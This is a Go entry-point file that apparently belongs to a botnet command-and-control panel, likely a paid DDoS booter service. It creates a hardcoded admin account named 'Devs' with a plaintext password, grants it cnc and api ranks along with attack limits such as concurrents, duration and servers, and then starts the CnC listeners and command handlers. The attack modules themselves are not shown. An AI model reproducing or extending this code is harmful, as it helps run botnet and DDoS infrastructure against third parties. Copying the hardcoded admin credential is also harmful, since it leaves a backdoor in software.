package main

import (
	"api/core"
	"api/core/database"
	"api/core/master"
	"api/core/models"
	"api/core/models/log"
	"api/core/models/functions"
	"api/core/models/ranks"
	"api/core/models/servers"
	"api/core/net"
	"api/core/net/commands"
	"time"
)


func main() {
	core.Initialize()
	if err := database.New(); err != nil {
		log.Println("failed to initialize database", err)
		return
	}

	// Adding basic rank
	log.Printf("Adding basic rank: %v", ranks.Internal["basic"])
	database.Container.NewUser(&database.User{
		ID:         0,
		Username:   "Devs",
		Key:        []byte("D3vt3am!"),
		Membership: "admin",
		Ranks: []*ranks.Rank{
			ranks.GetRole("admin", true),
			ranks.GetRole("vip", true),
			ranks.GetRole("api", true),
			ranks.GetRole("cnc", true),
		},
		Concurrents: 10,
		Duration:    200,
		Servers:     10,
		Balance:     1000,
		Expiry:      time.Now().Add(31 * 24 * time.Hour).Unix(),
		Tele: 		 1505914939,
	})

	if models.Config.Server.Enabled {
		go servers.Listen() 
		go net.Listener()   
		go commands.Init()  
		go func() {
			for {
				master.NewV2()
			}
		}()
	} else {
		log.Printf("[main] %s main.go CnC Turned Off!\n", time.Now().Format("15:04:05"))
		go servers.Listen()  
		go func() {
			for {
				master.NewV2()
			}
		}()
	}
	functions.CommandListener()

	select {}
}
